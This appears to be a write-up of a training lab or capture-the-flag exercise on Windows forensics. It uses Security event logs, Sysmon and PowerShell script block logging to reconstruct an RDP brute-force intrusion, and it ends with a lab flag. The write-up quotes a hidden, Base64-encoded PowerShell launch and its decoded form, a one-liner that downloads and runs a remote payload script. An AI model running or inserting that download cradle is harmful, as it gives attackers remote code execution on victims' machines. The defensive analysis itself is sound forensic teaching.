# 🔍 Day 11: The Forensic Investigator – Windows Event Logs & Sysmon

## 📝 Overview
Day 11 focuses on windows-based digital forensics, event correlation, and timeline reconstruction. The core objective of this lab is to investigate an intrusion lifecycle by analyzing native **Windows Security Event Logs**, leveraging advanced granularity via **Sysmon**, uncovering hidden payloads within **PowerShell Script Block Logging**, and tracing a successful RDP brute-force attack block by block.

---

## 🛠️ Core Concepts Covered
*   **Windows Security Event Logs:** Parsing native log repositories to trace authentications, process creations, and system modifications.
*   **Sysmon (System Monitor):** Expanding detection capabilities with high-resolution system telemetry (e.g., memory access, remote thread creation, network connections).
*   **Event Correlation:** Mapping scattered, isolated events (like multiple failures followed by a single success) into an active, contextualized security narrative.
*   **Timeline Reconstruction:** Arranging forensic evidence chronologically to map out an attacker's precise path from initial access to persistence.

---

## 🗄️ Core Windows & Sysmon Event IDs Analyzed

| Log Source | Event ID | Event Name | Forensic Significance / Detection Value |
| :--- | :--- | :--- | :--- |
| **Windows Security** | `4624` | Logon Success | Identifies the authentication type and account compromised. |
| **Windows Security** | `4625` | Logon Failure | High volumes indicate password spraying or brute-force attempts. |
| **Windows Security** | `4688` | Process Creation | Tracks binary execution, full command-line arguments, and parent processes. |
| **Windows Security** | `4698` | Scheduled Task Created | Flags persistence mechanisms disguised as routine system tasks. |
| **Windows Security** | `7045` | Service Installed | Catches unauthorized system services dropped to maintain persistent access. |
| **Sysmon** | `Event 1` | Process Creation | Provides structural integrity over parent-child process tracking and hash matching. |
| **Sysmon** | `Event 3` | Network Connection | Flags standard native binaries communicating with anomalous external IPs. |
| **Sysmon** | `Event 8` | CreateRemoteThread | Detects process injection (e.g., Mimikatz injecting into `lsass.exe`). |
| **Sysmon** | `Event 10` | Process Access | Captures credential dumping actions attempting to read sensitive process memory. |
| **Sysmon** | `Event 11` | File Creation | Surfaces dropped payloads and staged tools prior to execution. |
| **Sysmon** | `Event 13` | Registry Value Set | Monitors unauthorized additions to startup run-keys (`HKLM\...\Run`). |
| **PowerShell Operational** | `4104` | Script Block Logging | De-obfuscates and captures the full script execution blocks run by interpreter environments. |

---

## 🔬 Lab Investigation Steps & Achievements

### 🧩 Task 45: Sysmon Architecture & Mapping
*   Evaluated deep system telemetry capabilities using Sysmon data structures.
*   Mapped critical events to the **MITRE ATT&CK Framework** (e.g., *T1059: Command and Scripting Interpreter*, *T1055: Process Injection*, and *T1003.001: OS Credential Dumping*).

### 💻 Task 46 & 47: RDP Brute Force & Logon Correlation
*   Queried the Windows Security Log via PowerShell to extract rapid authentication failures originating from a malicious actor IP (`[REDACTED IP]`):
    ```powershell
    Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4625]]"
    ```
*   Correlated **10 consecutive Event 4625 failures** across multiple administrative usernames with a subsequent **Event 4624 Logon Success** under the `FINANCE\jsmith` session via an active RDP endpoint.

### 🧭 Task 48: Attack Chain Process Detections
*   Identified post-compromise reconnaissance activity immediately following the successful breach.
*   Flagged initial target execution commands under the newly spawned session, including system exploration binaries (`whoami /all`) as well as highly suspicious PowerShell configurations.

### 📟 AT50: De-Obfuscating PowerShell Script Block Logs
*   Analyzed a heavily obfuscated PowerShell command executing via an evasion parameter (`-EncodedCommand` / `-Enc`):
    ```bash
    powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
    ```

*   By leveraging UTF-16LE decoding principles modeled in the script block analysis step, the plaintext script string was successfully isolated from its Base64 state:
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('http://[REDACTED IP]/payload.ps1')
    ```
> **Forensic Insight:** While attackers frequently leverage `-EncodedCommand` syntax to bypass perimeter keyword alerts, native **Script Block Logging (Event ID 4104)** successfully record the dynamic plaintext execution code *after* it unpacks in system memory.

---

## 🏁 Case Timeline Reconstruction & Final Triage
Through disciplined logs analysis, the complete event chain was accurately reconstructed:
1.  **Initial Access:** External RDP brute force strategy against target `WKSTN-FIN02` (`10x EID 4625` → `1x EID 4624`).
2.  **Discovery:** Execution of baseline privilege checks (`whoami.exe`).
3.  **Execution & C2:** Launch of hidden, encoded PowerShell strings to download secondary network payloads (`EID 4104` / `EID 4688`).
4.  **Persistence:** Implementation of local task configurations and automated hidden binary items disguised as standard updates (`EID 4698` & `EID 7045`).

**🏆 Verified Flag:** `attackpattern{rdp_brute_force_4625_to_4624}`
